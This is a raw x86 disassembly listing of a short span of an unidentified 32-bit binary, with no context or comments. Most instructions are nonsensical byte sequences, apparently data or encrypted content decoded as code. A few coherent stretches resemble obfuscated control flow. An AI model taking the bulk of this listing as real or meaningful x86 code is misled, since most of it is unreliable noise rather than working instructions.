  40ace5:	xchg   edi,eax
  40ace6:	or     eax,0x14178337
  40aceb:	out    dx,al
  40acec:	nop
  40aced:	push   es
  40acee:	loope  0x40ad56
  40acf0:	sub    ecx,esp
  40acf2:	test   eax,0x45a507f
  40acf7:	inc    esp
  40acf8:	ret    
  40acf9:	fs mov ch,0x22
  40acfc:	call   0x897a3fe7
  40ad01:	retf   
  40ad02:	mov    bh,0xde
  40ad04:	or     BYTE PTR [ebx+0x3b],0xfd
  40ad08:	fisub  DWORD PTR [edi+0x4b]
  40ad0b:	(bad)  
  40ad0c:	xor    bh,BYTE PTR [ecx-0x2965497f]
  40ad12:	sbb    eax,0x709ed115
  40ad17:	add    DWORD PTR [eax],0x5a
  40ad1a:	jae    0x40ad7a
  40ad1c:	sbb    eax,0x19a14dc8
  40ad21:	jns    0x40ad9c
  40ad23:	pop    ss
  40ad24:	sub    al,0x5e
  40ad26:	ds mov eax,0xb2c809d5
  40ad2c:	ds cwde 
  40ad2e:	fisttp QWORD PTR [edx+0x40]
  40ad31:	and    eax,0x924a662f
  40ad36:	mov    ds:0xc103d564,al
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi-0x506f1f39]
  40ad81:	test   BYTE PTR [eax],0xf3
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	xchg   esi,eax
  40ad8b:	pop    esi
  40ad8c:	jmp    0x40ad8b
  40ad8e:	aam    0x86
  40ad90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad91:	jge    0x40ad40
  40ad93:	adc    bl,BYTE PTR [esi]
  40ad95:	push   ds
  40ad96:	sbb    esi,DWORD PTR [ebx+ecx*2+0x4ea154a9]
  40ad9d:	dec    edi
  40ad9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad9f:	addr16 retf 0x22a3
  40ada3:	add    DWORD PTR [ecx],edx
  40ada5:	mov    ch,0x80
  40ada7:	cwde   
  40ada8:	inc    ecx
  40ada9:	bound  esi,QWORD PTR [ebx]
  40adab:	xchg   ecx,eax
  40adac:	nop
  40adad:	mov    dl,0x53
  40adaf:	mov    ?,WORD PTR [edx-0x6977c465]
  40adb5:	jns    0x40adc3
  40adb7:	xor    al,0x53
  40adb9:	mov    ds:0x7d00caea,al
  40adbe:	(bad)  
  40adbf:	push   eax
  40adc0:	push   edi
  40adc1:	lods   al,BYTE PTR ds:[esi]
  40adc2:	pushf  
  40adc3:	dec    edx
  40adc4:	push   cs
  40adc5:	pop    esi
  40adc6:	cwde   
  40adc7:	idiv   esi
  40adc9:	mov    BYTE PTR [esi],0xef
  40adcc:	stos   DWORD PTR es:[edi],eax
  40adcd:	adc    DWORD PTR [ebx+0x51],edx
  40add0:	mov    edx,DWORD PTR [ecx+0x41a90f41]
  40add6:	out    0xbf,eax
  40add8:	shl    cx,cl
  40addb:	push   ss
  40addc:	adc    edx,DWORD PTR [ebx]
  40adde:	xchg   esi,eax
  40addf:	jb     0x40ad63
  40ade1:	add    BYTE PTR [ebx-0x42],ah
  40ade4:	pop    ds
  40ade5:	mov    ds:0xf9fdcc15,al
  40adea:	inc    eax
  40adeb:	adc    eax,0x3ffde71
  40adf0:	fsubr  QWORD PTR [ebx]
  40adf2:	sub    eax,0xcf2818c1
  40adf7:	jno    0x40adde
  40adf9:	cwde   
  40adfa:	xchg   edi,eax
  40adfb:	mul    bl
  40adfd:	jmp    0x40ae01
  40adff:	in     eax,dx
  40ae00:	gs ret 0xe054
  40ae04:	aad    0x42
  40ae06:	bnd jmp 0xc1b2af3a
  40ae0c:	or     ebp,DWORD PTR [edi+0x4]
  40ae0f:	cli    
  40ae10:	ror    WORD PTR [ecx+0x43],cl
  40ae14:	jge    0x40adcc
  40ae16:	and    eax,0x65ebf31
  40ae1b:	imul   ebx,DWORD PTR [eax-0x3494d90c],0xffffffa4
  40ae22:	aam    0x91
  40ae24:	or     esp,DWORD PTR [esi+0x4af43a61]
  40ae2a:	jb     0x40ae95
  40ae2c:	sbb    DWORD PTR [eax+0x1dc9f8d9],eax
  40ae32:	or     BYTE PTR [eax],dh
  40ae34:	xchg   DWORD PTR [ecx+0x56],ecx
  40ae37:	dec    edi
  40ae38:	addr16 push ebx
  40ae3a:	mov    bh,0x3c
  40ae3c:	mov    eax,0x249d8f2c
  40ae41:	inc    eax
  40ae42:	lds    esp,FWORD PTR [ecx+0x3a]
  40ae45:	sbb    BYTE PTR [ebx+0x19eb7eb],0xc
  40ae4c:	ss xchg ebp,eax
  40ae4e:	inc    BYTE PTR [edi]
  40ae50:	mov    ds:0xe188cf16,al
  40ae55:	dec    edx
  40ae56:	dec    esi
  40ae57:	scas   eax,DWORD PTR es:[edi]
  40ae58:	push   ebx
  40ae59:	inc    ebx
  40ae5a:	mov    ebp,0x722f3c4
  40ae5f:	mov    dh,0xf3
  40ae61:	push   ds
  40ae62:	aas    
  40ae63:	mul    ebp
  40ae65:	mov    cl,0x13
  40ae67:	dec    eax
  40ae68:	or     al,0xf5
  40ae6a:	call   0xd5f9:0x1691b6a0
  40ae71:	lea    edx,[ecx-0x46a7fc6a]
  40ae77:	mov    edi,0x3ae7437
  40ae7c:	sbb    eax,0xaf409c3
  40ae81:	jno    0x40ae0d
  40ae83:	ds xchg esi,eax
  40ae85:	(bad)  
  40ae86:	rol    DWORD PTR ss:[ecx],1
  40ae89:	stos   DWORD PTR es:[edi],eax
  40ae8a:	call   0x157b:0xeffd8b9f
  40ae91:	jne    0x40ae53
  40ae93:	sbb    edi,DWORD PTR [esi-0x67]
  40ae96:	mov    ds:0x3e400cbf,eax
  40ae9b:	lods   eax,DWORD PTR ds:[esi]
  40ae9c:	sub    eax,0x6d74f89c
  40aea1:	mov    ah,0x85
  40aea3:	jmp    0x40ae2d
  40aea5:	fnstcw WORD PTR [ebx+0x62]
  40aea8:	dec    eax
  40aea9:	cmp    al,0x0
  40aeab:	xlat   BYTE PTR ds:[ebx]
  40aeac:	xchg   ecx,eax
  40aead:	dec    ecx
  40aeae:	aaa    
  40aeaf:	test   eax,0x669174a
  40aeb4:	out    0xfc,eax
  40aeb6:	pop    esi
  40aeb7:	adc    al,0xf
  40aeb9:	xchg   esi,eax
  40aeba:	inc    edx
  40aebb:	jo     0x40aebf
  40aebd:	add    esi,DWORD PTR [esi+0x357920e9]
  40aec3:	jmp    0x681d406d
  40aec8:	mov    ds:0x7eb454c7,eax
  40aecd:	test   eax,0xcf1b8fb3
  40aed2:	jmp    0x2f50:0x9546d0ab
  40aed9:	adc    bl,BYTE PTR [ecx+0x69]
  40aedc:	mov    edx,0x4903c74d
  40aee1:	lods   al,BYTE PTR ds:[esi]
  40aee2:	arpl   WORD PTR [edi],di
  40aee4:	inc    edx
  40aee5:	aam    0x95
  40aee7:	cmp    esi,edx
  40aee9:	fwait
  40aeea:	mov    esp,0x5b5fcaac
  40aeef:	imul   ebp,DWORD PTR [edx+ebx*8+0x3bc959d5],0xffffffcf
  40aef7:	call   0x6a00815
  40aefc:	xchg   ebp,eax
  40aefd:	push   edi
  40aefe:	dec    ebp
  40aeff:	add    eax,0x5e340358
  40af04:	pop    ebp
  40af05:	dec    esp
  40af06:	and    ecx,edi
  40af08:	push   ebx
  40af09:	mov    dh,0xa0
  40af0b:	mov    al,ds:0x8a09bade
  40af10:	xchg   esi,eax
  40af11:	or     al,BYTE PTR [esi]
  40af13:	mov    edi,0x10d63398
  40af18:	lods   al,BYTE PTR ds:[esi]
  40af19:	out    0x34,al
  40af1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af1c:	fnsave [edi-0x5c55e1c6]
  40af22:	mov    ds:0x2155a2ed,eax
  40af27:	sar    BYTE PTR [ebx],0xcc
  40af2a:	mov    ds:0xbc3c8e22,eax
  40af2f:	lods   al,BYTE PTR ds:[esi]
  40af30:	or     dh,BYTE PTR [esi]
  40af32:	dec    ecx
  40af33:	fidivr DWORD PTR [edx+0xb3be257]
  40af39:	mov    ebp,0x72c6f680
  40af3e:	or     BYTE PTR [edi-0x36f6d9c6],ch
  40af44:	xchg   edx,eax
  40af45:	dec    ebp
  40af46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af47:	xchg   esi,eax
  40af48:	call   0xb31003f5
  40af4d:	fistp  DWORD PTR cs:[ecx-0x56]
  40af51:	xlat   BYTE PTR ds:[ebx]
  40af52:	pop    edx
  40af53:	jbe    0x40af12
  40af55:	push   0x3
  40af57:	aam    0x72
  40af59:	mov    al,ds:0x707b9f53
  40af5e:	dec    edx
  40af5f:	or     ebp,edx
  40af61:	imul   ebx,DWORD PTR [edx],0x7f
  40af64:	mov    ch,BYTE PTR [edx]
  40af66:	in     al,0x6b
  40af68:	add    cl,cl
  40af6a:	mov    esp,0x4e68647f
  40af6f:	inc    edx
  40af70:	nop
  40af71:	repz loop 0x40afbd
  40af74:	pop    edi
  40af75:	push   esi
  40af76:	mov    ds:0xa18f830d,al
  40af7b:	int    0x84
  40af7d:	test   edi,0x2ffbe6ca
  40af83:	int3   
  40af84:	adc    edx,DWORD PTR [edx-0xfa3ca80]
  40af8a:	in     al,dx
  40af8b:	fsubr  QWORD PTR ds:0x1b7da0df
  40af91:	push   ss
  40af92:	adc    DWORD PTR [edi],0x7896169a
  40af98:	push   0xf7cbefbd
  40af9d:	je     0x40af7f
  40af9f:	push   0x4f
  40afa1:	jle    0x40affb
  40afa3:	push   eax
  40afa4:	pusha  
  40afa5:	jb     0x40afa5
  40afa7:	pop    ebp
  40afa8:	loope  0x40b01b
  40afaa:	fucom  st(0)
  40afac:	neg    ah
  40afae:	ret    
  40afaf:	popf   
  40afb0:	setno  al
  40afb3:	xchg   edx,eax
  40afb4:	aaa    
  40afb5:	sub    edx,edi
  40afb7:	or     cl,BYTE PTR [ebx+0x66e43fa]
  40afbd:	sub    DWORD PTR [edx],ecx
  40afbf:	push   ds
  40afc0:	dec    ebp
  40afc1:	sti    
  40afc2:	inc    edx
  40afc3:	add    al,0xf7
  40afc5:	lea    edi,[esi]
  40afc7:	shr    BYTE PTR [ebx],0xe5
  40afca:	loope  0x40afdd
  40afcc:	xor    BYTE PTR [ecx+0x3d],bh
  40afcf:	sub    ax,0x83ef
  40afd3:	add    esi,DWORD PTR [ebx+ebp*2-0x77276f60]
  40afda:	xchg   BYTE PTR [edx-0x34],ah
  40afdd:	jae    0x40afe1
  40afdf:	cdq    
  40afe0:	sbb    DWORD PTR [ecx-0x4f],eax
  40afe3:	xchg   ebp,edi
  40afe5:	lods   al,BYTE PTR ds:[esi]
  40afe6:	outs   dx,DWORD PTR ds:[esi]
  40afe7:	rcr    BYTE PTR [eax+0x64efa6d1],cl
  40afed:	ret    
  40afee:	js     0x40b004
  40aff0:	or     eax,0x9e277a01
  40aff5:	xor    DWORD PTR [eax],edi
  40aff7:	sub    bl,bh
  40aff9:	out    0x1,al
  40affb:	or     edi,DWORD PTR [ebx+0x518f6909]
  40b001:	inc    ecx
  40b002:	mov    ch,0x77
  40b004:	add    eax,DWORD PTR [ebp+0x3849e064]
  40b00a:	xor    al,0x3f
  40b00c:	(bad)
  40b011:	out    dx,al
  40b012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b013:	sub    eax,0xb2f18182
  40b018:	or     eax,eax
  40b01a:	or     al,0x24
  40b01c:	fisttp WORD PTR [ecx+0x4f454224]
  40b022:	punpckldq mm1,DWORD PTR [edx-0x5a8cc937]
  40b029:	std    
  40b02a:	push   ecx
  40b02b:	fstp   TBYTE PTR [edx+0x2f]
  40b02e:	out    dx,eax
  40b02f:	(bad)  
  40b030:	mov    cl,0x6e
  40b032:	dec    edx
  40b033:	fdiv   st,st(0)
  40b035:	fs push ebp
  40b037:	icebp  
  40b038:	ds fiadd DWORD PTR cs:[edi+0x48]
  40b03d:	or     eax,0x4bde498e
  40b042:	mov    bl,BYTE PTR [eax]
  40b044:	mov    cl,0x4f
  40b046:	cdq    
  40b047:	shl    edi,1
  40b049:	mov    es,ecx
  40b04b:	mov    ah,0x80
  40b04d:	aaa    
  40b04e:	pop    ds
  40b04f:	and    DWORD PTR [esi+0x6604244a],esp
  40b055:	and    DWORD PTR [eax],esi
  40b057:	push   eax
  40b058:	and    eax,0xcd8b8eca
  40b05d:	(bad)  
  40b05f:	xor    DWORD PTR [esi-0x1954437d],0xffffffc2
  40b066:	int3   
  40b067:	or     BYTE PTR [esi],ah
  40b069:	out    0x8a,eax
  40b06b:	sbb    al,BYTE PTR [eax+edx*1+0x4b7e386c]
  40b072:	daa    
  40b073:	push   edi
  40b074:	mov    ebx,0x3c00cb14
  40b079:	retf   0xac81
  40b07c:	ins    DWORD PTR es:[edi],dx
  40b07d:	mov    esp,0x9542d3fd
  40b082:	fwait
  40b083:	das    
  40b084:	and    ebx,esi
  40b086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b087:	mov    ds:0x1583bb5c,al
  40b08c:	(bad)  
  40b08d:	push   eax
  40b08e:	mov    eax,DWORD PTR [ebp-0x20]
  40b091:	mov    ecx,DWORD PTR [ebp-0x8]
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	dec    eax
  40b0ba:	xchg   edi,eax
  40b0bb:	mov    ecx,0x7efe0c2a
  40b0c0:	jle    0x40b13c
  40b0c2:	jge    0x40b142
  40b0c4:	jle    0x40b071
  40b0c6:	enter  0x2921,0xb6
  40b0ca:	sub    eax,DWORD PTR [ecx-0x27769d56]
  40b0d0:	iret   
  40b0d1:	jae    0x40b13e
  40b0d3:	xchg   ebx,eax
  40b0d4:	inc    edx
  40b0d5:	mov    eax,0x369a24c5
  40b0da:	jg     0x40b07a
  40b0dc:	xor    dl,dl
  40b0de:	fwait
  40b0df:	mov    bl,0xb9
  40b0e1:	(bad)  
  40b0e2:	jmp    0xe41f:0xcb53db6
  40b0e9:	push   ecx
  40b0ea:	sti    
  40b0eb:	stc    
  40b0ec:	jge    0x40b160
  40b0ee:	cmp    BYTE PTR [esi],0xd8
  40b0f1:	xchg   esp,eax
  40b0f2:	out    0xb5,al
  40b0f4:	jno    0x40b0cb
  40b0f6:	fdivr  DWORD PTR ds:0x2b0ce9bf
  40b0fc:	add    al,0xe6
  40b0fe:	push   ebp
  40b0ff:	cdq    
  40b100:	imul   esp,DWORD PTR [eax],0x77
  40b103:	scas   al,BYTE PTR es:[edi]
  40b104:	mov    cl,0xb
  40b106:	gs mov ch,0xb4
  40b109:	xchg   ecx,eax
  40b10a:	jne    0x40b0d6
  40b10c:	jmp    0xf106:0x855e9fa1
  40b113:	sub    eax,0xf2e3c071
  40b118:	(bad)  
  40b119:	mov    esp,0xf31d8405
  40b11e:	push   ebp
  40b11f:	icebp  
  40b120:	sbb    al,0x11
  40b122:	out    dx,eax
  40b123:	pop    eax
  40b124:	add    esp,edx
  40b126:	mov    ecx,0x6806804a
  40b12b:	dec    ecx
  40b12c:	test   ch,cl
  40b12e:	ja     0x40b181
  40b130:	mov    edx,0x62bb27ed
  40b135:	inc    ecx
  40b136:	mov    DWORD PTR [ebx-0x5e53c0f9],esp
  40b13c:	sbb    al,0xc8
  40b13e:	pusha  
  40b13f:	jae    0x40b1a8
  40b141:	jne    0x40b10c
  40b143:	test   al,0xfd
  40b145:	mov    DWORD PTR [ebx-0x3c940dfe],edi
  40b14b:	pop    ds
  40b14c:	clc    
  40b14d:	imul   ebp,DWORD PTR [ebp-0x31],0x37513751
  40b154:	test   eax,0x15d85590
  40b159:	push   edi
  40b15a:	inc    edi
  40b15b:	ret    
  40b15c:	sub    DWORD PTR [edi-0x33],esp
  40b15f:	jae    0x40b1b0
  40b161:	xor    BYTE PTR [edx-0x60],0x9b
  40b165:	mov    dh,0xd
  40b167:	aad    0x83
  40b169:	adc    ah,BYTE PTR [esi+0x44b2a15f]
  40b16f:	(bad)  [eax]
  40b171:	inc    esi
  40b172:	jp     0x40b10a
  40b174:	pop    edx
  40b175:	dec    eax
  40b176:	fdiv   DWORD PTR [esp+edx*8+0x4da9f637]
  40b17d:	aaa    
  40b17e:	jno    0x40b144
  40b180:	js     0x40b152
  40b182:	xor    ecx,DWORD PTR [edx+0x49]
  40b185:	popa   
  40b186:	push   ebp
  40b187:	sbb    al,0xe9
  40b189:	repnz xor eax,0x898d2365
  40b18f:	xor    al,0xf4
  40b191:	cmp    DWORD PTR [eax-0x70],0x57
  40b195:	ret    
  40b196:	mov    ah,0x33
  40b198:	adc    edx,DWORD PTR [ebx-0x63610cc3]
  40b19e:	retf   0x4814
  40b1a1:	repnz and cl,BYTE PTR [ebp+eiz*2-0x343721d]
  40b1a9:	mov    esi,DWORD PTR [ecx]
  40b1ab:	xor    DWORD PTR [edx+0x362fd876],ebp
  40b1b1:	and    DWORD PTR [esi-0x7435cbb],ecx
  40b1b7:	and    BYTE PTR [eax-0x2e5367ab],0x10
  40b1be:	shrd   ecx,eax,cl
  40b1c1:	adc    eax,0xbf17aa01
  40b1c6:	int3   
  40b1c7:	fnstsw WORD PTR [ebp+0x3b]
  40b1ca:	(bad)  
  40b1cb:	dec    ebp
  40b1cc:	shl    BYTE PTR [ecx],cl
  40b1ce:	add    esp,DWORD PTR [esi]
  40b1d0:	aas    
  40b1d1:	popa   
  40b1d2:	stc    
  40b1d3:	sub    al,0x8c
  40b1d5:	xchg   ecx,eax
  40b1d6:	jno    0x40b20a
  40b1d8:	cld    
  40b1d9:	bound  esp,QWORD PTR ds:0x103f28c0
  40b1df:	and    dl,BYTE PTR [eax+0x7f]
  40b1e2:	xchg   edx,eax
  40b1e3:	pusha  
  40b1e4:	add    eax,0x34f82832
  40b1e9:	loop   0x40b1bf
  40b1eb:	xadd   BYTE PTR [edx],dh
  40b1ee:	xchg   edx,eax
  40b1ef:	add    esi,DWORD PTR [eax]
  40b1f1:	push   ecx
  40b1f2:	mov    eax,ds:0x34cd79bb
  40b1f7:	add    eax,0x69768fed
  40b1fc:	push   ss
  40b1fd:	stos   BYTE PTR es:[edi],al
  40b1fe:	aas    
  40b1ff:	daa    
  40b200:	push   ebx
  40b201:	daa    
  40b202:	fs repnz aas 
  40b205:	sub    BYTE PTR [ecx],0x39
  40b208:	mov    BYTE PTR [ebx+esi*4],dh
  40b20b:	ja     0x40b205
  40b20d:	xchg   edi,eax
  40b20e:	idiv   esi
  40b210:	push   eax
  40b211:	mov    ds:0x4dd4e98f,eax
  40b216:	mov    cl,0x8
  40b218:	sub    BYTE PTR [eax],ah
  40b21a:	sub    dh,ch
  40b21c:	mov    bl,0x22
  40b21e:	sbb    al,cl
  40b220:	adc    eax,0x6a607583
  40b225:	imul   ebx,DWORD PTR [ebp-0x73142e22],0xdde19083
  40b22f:	push   ds
  40b230:	dec    ebp
  40b231:	test   BYTE PTR [ebx+0x5b5ff400],bl
  40b237:	js     0x40b25d
  40b239:	fldenv [edi-0x545ec4e7]
  40b23f:	frstor [edx+eiz*8+0x5cb170b5]
  40b246:	mov    eax,ds:0xe27b5690
  40b24b:	fs dec ecx
  40b24d:	cli    
  40b24e:	add    edx,DWORD PTR [esi]
  40b250:	xor    BYTE PTR [ebx+0x319a4006],dl
  40b256:	(bad)  
  40b257:	aaa    
  40b258:	mov    eax,0xbd0d7a3c
  40b25d:	or     ch,BYTE PTR [ebp+0x1cae087d]
  40b263:	pop    esp
  40b264:	xor    eax,0x52cd38d5
  40b269:	repz pop ebp
  40b26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b26c:	ret    0x2f1a
  40b26f:	pop    ds
  40b270:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40b272:	mov    edi,0xac2e1994
  40b277:	and    cl,BYTE PTR ds:0x7f269a00
  40b27d:	mov    bh,0x6
  40b27f:	sahf   
  40b280:	mov    edx,0xed043c59
  40b285:	aaa    
  40b286:	xchg   ebp,eax
  40b287:	imul   edi,DWORD PTR [ebx+0x1a8749c6],0x35
  40b28e:	call   0x8d72907f
  40b293:	popa   
  40b294:	push   0x17
  40b296:	js     0x40b2fe
  40b298:	mov    BYTE PTR [ebx+0x16193ecb],0x3f
  40b29f:	je     0x40b24a
  40b2a1:	or     BYTE PTR [esi-0x7b6bfabf],0x20
  40b2a8:	push   ecx
  40b2a9:	jge    0x40b26f
  40b2ab:	jp     0x40b316
  40b2ad:	or     ebp,DWORD PTR [edi]
  40b2af:	ret    
  40b2b0:	jno    0x40b31f
  40b2b2:	and    al,0x4b
  40b2b4:	push   ss
  40b2b5:	adc    DWORD PTR [ecx+0x2],0xffffffbc
  40b2b9:	jmp    0xecb676ad
  40b2be:	imul   esp,DWORD PTR [esi],0xffffffc7
  40b2c1:	adc    DWORD PTR [ebp+0x2bf51ae9],ecx
  40b2c7:	jge    0x40b2d5
  40b2c9:	inc    ebp
  40b2ca:	clc    
  40b2cb:	lods   eax,DWORD PTR ds:[esi]
  40b2cc:	push   ebx
  40b2cd:	inc    edx
  40b2ce:	pop    eax
  40b2cf:	cmp    cl,BYTE PTR [eax]
  40b2d1:	icebp  
  40b2d2:	dec    esi
  40b2d3:	not    BYTE PTR [eax-0x6]
  40b2d6:	mov    ds:0x5195f518,eax
  40b2db:	push   ebx
  40b2dc:	pop    esp
  40b2dd:	xchg   edi,eax
  40b2de:	sub    al,0x68
  40b2e0:	mov    WORD PTR [edx-0x23],?
  40b2e3:	jg     0x40b2d3
  40b2e5:	inc    edi
  40b2e6:	popa   
  40b2e7:	jge    0x40b2ce
  40b2e9:	out    dx,al
  40b2ea:	inc    esp
  40b2eb:	cmp    DWORD PTR [ebx],ebp
  40b2ed:	lods   eax,DWORD PTR fs:[esi]
  40b2ef:	xchg   DWORD PTR ds:0xda062ae2,edi
  40b2f5:	pop    ecx
  40b2f6:	and    al,0x69
  40b2f8:	gs mov al,0x54
  40b2fb:	or     al,0x45
  40b2fd:	lea    ebp,[ebx-0x5c812cb4]
  40b303:	fstp   DWORD PTR [esi-0x630b21c7]
  40b309:	stos   BYTE PTR es:[edi],al
  40b30a:	and    al,0x45
  40b30c:	push   cs
  40b30d:	push   ds
  40b30e:	xchg   esi,eax
  40b30f:	nop
  40b310:	fwait
  40b311:	pop    edx
  40b312:	aad    0xd3
  40b314:	adc    eax,0xb6cc9bac
  40b319:	stos   DWORD PTR es:[edi],eax
  40b31a:	shl    eax,0xe6
  40b31d:	mov    ebp,0xb5ab3f2b
  40b322:	pushf  
  40b323:	or     BYTE PTR [edi+0x313bbb02],cl
  40b329:	or     eax,0x27b6471d
  40b32e:	sbb    eax,0xc48ed92b
  40b333:	pop    eax
  40b334:	dec    eax
  40b335:	sbb    BYTE PTR [ebp-0x2c9e658d],cl
  40b33b:	pop    edx
  40b33c:	ret    
  40b33d:	lods   al,BYTE PTR ds:[esi]
  40b33e:	jl     0x40b336
  40b340:	call   0x1ce50ad4
  40b345:	mov    dh,BYTE PTR [edi-0x358bd36b]
  40b34b:	ficom  WORD PTR [edx]
  40b34d:	in     al,0xc0
  40b34f:	adc    DWORD PTR [ebx+edi*2+0x46],edx
  40b353:	push   ecx
  40b354:	mov    BYTE PTR [ebp-0x21],ch
  40b357:	push   eax
  40b358:	pop    ebp
  40b359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b35a:	(bad)  
  40b35b:	or     eax,0xce559b86
  40b360:	clc    
  40b361:	mov    dh,0xbd
  40b363:	in     al,0xcb
  40b365:	shr    BYTE PTR [edx+0x5ecfab04],0x6
  40b36c:	sub    al,0x84
  40b36e:	push   ebx
  40b36f:	or     BYTE PTR [eax+0x52],bh
  40b372:	mov    eax,0x8288032e
  40b377:	pusha  
  40b378:	mov    al,ds:0xcaa227b2
  40b37d:	mov    gs,WORD PTR [ebx+0x34]
  40b380:	stos   DWORD PTR es:[edi],eax
  40b381:	sbb    edi,DWORD PTR [ebp+0x5a]
  40b384:	sbb    ecx,DWORD PTR [eax]
  40b386:	popf   
  40b387:	in     al,dx
  40b388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b389:	daa    
  40b38a:	mov    bh,0x69
  40b38c:	cmc    
  40b38d:	sbb    dh,BYTE PTR [edx]
  40b38f:	stos   DWORD PTR es:[edi],eax
  40b390:	xor    esi,ebp
  40b392:	adc    BYTE PTR [eax+0x19],0xa9
  40b396:	mov    ebp,DWORD PTR [edx-0x789ede4e]
  40b39c:	xchg   ebp,eax
  40b39d:	in     eax,0xd4
  40b39f:	pop    es
  40b3a0:	xchg   ecx,eax
  40b3a1:	mov    dl,0x36
  40b3a3:	or     BYTE PTR [eax+0x650a1c17],dl
  40b3a9:	repnz out 0x2c,al
  40b3ac:	dec    edx
  40b3ad:	sub    al,0x72
  40b3af:	mov    esi,0xc2a21aee
  40b3b4:	xchg   ebp,eax
  40b3b5:	adc    edi,DWORD PTR [edi*1-0x34492468]
  40b3bc:	mov    eax,0xde5b3a69
  40b3c1:	jbe    0x40b3f4
  40b3c3:	mov    ch,0xfe
  40b3c5:	test   DWORD PTR [edi+0x458b2836],eax
  40b3cb:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0xb2765054
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	pop    edx
  40b3f1:	add    dl,BYTE PTR [ecx-0x7e10abff]
  40b3f7:	gs mov ecx,0x39717b34
  40b3fd:	mov    DWORD PTR [edx+0x60],esi
  40b400:	fstp   QWORD PTR [ecx]
  40b402:	push   0xfffffffa
  40b404:	push   ecx
  40b405:	lods   eax,DWORD PTR ds:[esi]
  40b406:	xchg   esi,eax
  40b407:	push   ecx
  40b408:	push   0x2
  40b40a:	cwde   
  40b40b:	retf   
  40b40c:	fist   DWORD PTR [ebx+edx*4+0x7]
  40b410:	jae    0x40b39f
  40b412:	and    dh,BYTE PTR [eax+0x310fd962]
  40b418:	jno    0x40b472
  40b41a:	fs inc esp
  40b41c:	sub    ah,BYTE PTR [ebx]
  40b41e:	fisubr DWORD PTR ds:0xe5ffc96d
  40b424:	xlat   BYTE PTR ds:[ebx]
  40b425:	mov    esi,0xba386b38
  40b42a:	sti    
  40b42b:	movq   QWORD PTR [ecx-0x10],mm1
  40b42f:	sub    eax,0xe405b408
  40b434:	int3   
  40b435:	mov    ebx,0x495b4758
  40b43a:	or     al,0xfc
  40b43c:	mov    ch,0xec
  40b43e:	xor    ah,BYTE PTR [ebp+ebx*2-0x59]
  40b442:	sub    esp,DWORD PTR [eax]
  40b444:	xchg   ebp,eax
  40b445:	(bad)  
  40b446:	xchg   edx,eax
  40b447:	add    BYTE PTR [edi],ah
  40b449:	pop    ebp
  40b44a:	dec    ecx
  40b44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b44c:	js     0x40b46b
  40b44e:	adc    al,0x31
  40b450:	mov    dl,0xca
  40b452:	pop    esi
  40b453:	shr    BYTE PTR [edi-0x47],0xb1
  40b457:	xlat   BYTE PTR ds:[ebx]
  40b458:	mov    gs,WORD PTR [esi+edx*1]
  40b45b:	mov    bl,0x3d
  40b45d:	(bad)  
  40b45e:	xor    BYTE PTR [esi],bh
  40b460:	dec    eax
  40b461:	mov    dh,0xc2
  40b463:	sti    
  40b464:	(bad)  
  40b465:	fndisi(8087 only) 
  40b467:	sbb    ecx,DWORD PTR [edi+0x56]
  40b46a:	imul   esi,DWORD PTR [ebx+esi*1-0x6cf60c83],0x10
  40b472:	jp     0x40b45e
  40b474:	add    eax,0xcae036d6
  40b479:	test   al,0x1f
  40b47b:	outs   dx,DWORD PTR ds:[esi]
  40b47c:	scas   al,BYTE PTR es:[edi]
  40b47d:	mov    ds:0x33e0aaf7,eax
  40b482:	bound  ecx,QWORD PTR [esi+eiz*4+0x5f9c3df0]
  40b489:	outs   dx,DWORD PTR ds:[esi]
  40b48a:	aas    
